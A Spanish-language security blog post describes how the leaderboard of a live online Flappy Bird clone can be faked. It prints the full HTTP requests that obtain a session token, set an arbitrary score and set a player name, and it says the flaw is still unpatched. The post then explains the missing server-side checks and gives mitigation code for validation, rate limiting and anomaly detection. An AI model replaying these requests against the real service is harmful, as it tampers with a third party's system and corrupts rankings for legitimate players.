---
layout: single
title: "Hackeando Flappy Bird: Cómo Manipular Puntuaciones sin Jugar"
excerpt: Análisis de vulnerabilidad en el popular juego Flappy Bird online que permite manipular puntuaciones mediante requests HTTP directas, burlando completamente la lógica del juego.
date: 2025-08-22
classes: wide
header:
  teaser: /assets/images/flappy-bird-hack/logo.jpeg
  teaser_home_page: true
  icon: /assets/images/flappy-bird-hack/logo.jpeg
categories:
  - infosec
  - vulnerability
  - web-hacking
tags:  
  - Web Security
  - API Vulnerability
  - Score Manipulation
  - Game Hacking
  - HTTP Requests
---

## Introducción: Cuando los Juegos No Validan del Lado del Servidor

**¡Hola a todos!** Hoy vamos a analizar una vulnerabilidad fascinante en el popular juego **Flappy Bird online** disponible en [https://flappybird.io/](https://flappybird.io/). Durante una investigación de seguridad, descubrí que es posible **manipular completamente las puntuaciones** sin siquiera jugar el juego, simplemente enviando requests HTTP directas al backend.

![Flappy Bird Hack](/assets/images/flappy-bird-hack/logo.png)

### El Juego: Flappy Bird Online

[Flappy Bird](https://flappybird.io/) es una recreación web del famoso juego móvil, donde los jugadores deben hacer volar un pájaro a través de tuberías sin chocar. El juego incluye:

- **Sistema de puntuación** en tiempo real
- **Leaderboard** con las mejores puntuaciones
- **Backend API** en `flappy-backend.fly.dev`

## El Descubrimiento: API Sin Validación

### Análisis del Tráfico HTTP

Al interceptar el tráfico HTTP durante el juego, identifiqué un patrón interesante en las comunicaciones con el servidor backend.

#### **Request 1: Obtener Token de Sesión**

```http
POST /scores HTTP/2
Host: flappy-backend.fly.dev
Content-Length: 0
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: */*
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Origin: https://flappybird.io
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://flappybird.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i
```

#### **Respuesta del Servidor**

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 59
X-Ratelimit-Reset: 1755782984
Date: Thu, 21 Aug 2025 13:28:44 GMT
Server: Fly/da35c1382 (2025-08-20)
Via: 2 fly.io, 2 fly.io
Fly-Request-Id: 01K36D2HZ9YQXH38T0V6V7D74A-cdg

{"token":"JmuQBFvSPWBeLFGJxniOCSnFcPpglqGs"}
```

## La Vulnerabilidad: Manipulación Directa de Puntuaciones

### **Paso 2: Establecer Puntuación Falsa**

Con el token obtenido, es posible **establecer cualquier puntuación** sin haber jugado:

```http
POST /scores/JmuQBFvSPWBeLFGJxniOCSnFcPpglqGs?count=3 HTTP/2
Host: flappy-backend.fly.dev
Content-Length: 0
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Origin: https://flappybird.io
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://flappybird.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i
```

#### **Respuesta del Servidor**

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 59
X-Ratelimit-Reset: 1755782996
Date: Thu, 21 Aug 2025 13:28:56 GMT
Server: Fly/da35c1382 (2025-08-20)
Via: 2 fly.io, 2 fly.io
Fly-Request-Id: 01K36D2YA0H6NG3NCCQVQD2JTD-cdg

{"msg":"ok"}
```

### **Paso 3: Establecer Nombre del Jugador**

Finalmente, establecemos el nombre que aparecerá en el leaderboard:

```http
POST /scores/JmuQBFvSPWBeLFGJxniOCSnFcPpglqGs?name=pikasito HTTP/2
Host: flappy-backend.fly.dev
Content-Length: 0
Sec-Ch-Ua-Platform: "macOS"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: */*
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Origin: https://flappybird.io
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://flappybird.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i
```

#### **Respuesta Final**

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
X-Ratelimit-Limit: 60
X-Ratelimit-Remaining: 59
X-Ratelimit-Reset: 1755783131
Date: Thu, 21 Aug 2025 13:31:11 GMT
Server: Fly/da35c1382 (2025-08-20)
Via: 2 fly.io, 2 fly.io
Fly-Request-Id: 01K36D71FRK9YFPVMSK906EYQ5-cdg

{"msg":"ok"}
```
![Flappy Bird Hack](/assets/images/flappy-bird-hack/flappy1.png)

### Resultado del Ataque

Con este simple flujo, cualquier atacante puede:

- ✅ **Aparecer en el leaderboard** con puntuaciones imposibles
- ✅ **Manipular rankings** sin haber jugado
- ✅ **Contaminar la competencia** legítima
- ✅ **Burlar completamente** la lógica del juego

## Análisis de la Vulnerabilidad

### 🚨 **Problemas Identificados**

#### **Falta de Validación del Lado del Servidor**
- El servidor **acepta cualquier puntuación** sin validación
- **No hay verificación** de que el juego realmente se jugó
- **Ausencia de lógica anticheat** básica

#### **API Endpoints Expuestos**
- Los endpoints de puntuación están **completamente expuestos**
- **Sin autenticación robusta** más allá del token temporal
- **CORS permitido desde cualquier origen** (`Access-Control-Allow-Origin: *`)

#### **Tokens Predecibles**
- Los tokens generados podrían tener **patrones predecibles**
- **Sin rate limiting efectivo** para generación de tokens
- **Reutilización de tokens** potencialmente posible

## Impacto y Riesgos

### 🎯 **Para los Jugadores Legítimos**

- **Leaderboards contaminados** con puntuaciones falsas
- **Pérdida de motivación** por competencia desleal
- **Experiencia de juego degradada**

### 🏢 **Para los Desarrolladores**

- **Pérdida de integridad** del sistema de puntuaciones
- **Daño reputacional** del juego
- **Métricas de engagement falsas**

## Recomendaciones de Mitigación

### 🛡️ **Soluciones Inmediatas**

#### **Validación del Lado del Servidor**

```javascript
// Ejemplo de validación básica
app.post('/scores/:token', async (req, res) => {
  const { count } = req.query;
  const gameSession = await getGameSession(req.params.token);
  
  // Validar que la sesión de juego sea legítima
  if (!gameSession.isActive || gameSession.gameCompleted !== true) {
    return res.status(403).json({ error: 'Invalid game session' });
  }
  
  // Validar puntuación realista
  if (count > gameSession.maxPossibleScore) {
    return res.status(400).json({ error: 'Unrealistic score' });
  }
  
  // Validar tiempo de juego mínimo
  const gameTime = Date.now() - gameSession.startTime;
  const minTime = count * 1000; // 1 segundo por punto mínimo
  
  if (gameTime < minTime) {
    return res.status(400).json({ error: 'Game completed too quickly' });
  }
});
```

#### **Implementar Anti-Cheat Básico**

- **Tracking de acciones del juego** en el cliente
- **Validación de secuencia temporal** de eventos
- **Límites realistas** de puntuación por tiempo jugado
- **Verificación de inputs** del usuario

#### **Seguridad de API**

```javascript
// Rate limiting más estricto
const rateLimit = require('express-rate-limit');

const scoreLimit = rateLimit({
  windowMs: 60 * 1000, // 1 minuto
  max: 5, // máximo 5 intentos por minuto
  message: 'Too many score submissions'
});

app.use('/scores', scoreLimit);
```

### 🔐 **Mejores Prácticas**

#### **Arquitectura Segura**
- **Validación dual** (cliente + servidor)
- **Tokens con expiración corta**
- **Logging y monitoreo** de patrones anómalos
- **Sanitización de inputs** de usuario

#### **Detección de Anomalías**
```javascript
// Detectar patrones sospechosos
const detectAnomalies = (score, playerHistory) => {
  const avgScore = playerHistory.reduce((a, b) => a + b, 0) / playerHistory.length;
  const scoreIncrease = score / avgScore;
  
  // Si el aumento es mayor a 300%, marcar como sospechoso
  if (scoreIncrease > 3.0) {
    flagForReview(score, playerHistory);
  }
};
```

## Conclusiones

### Lecciones Aprendidas

Este caso demuestra problemas críticos comunes en **juegos web**:

- **Confianza ciega en el cliente** es peligrosa
- **APIs expuestas** requieren validación robusta
- **Sistemas de puntuación** necesitan múltiples capas de seguridad

#### Para Desarrolladores de Juegos
- **Nunca confíes solo en el cliente** para validación crítica
- **Implementa anti-cheat básico** desde el diseño
- **Monitorea patrones anómalos** continuamente

#### Estado Actual
El juego sigue siendo **vulnerable** al momento de esta publicación.

*Este análisis se publica con fines educativos para concienciar sobre la importancia de la validación del lado del servidor en aplicaciones web de juegos.*
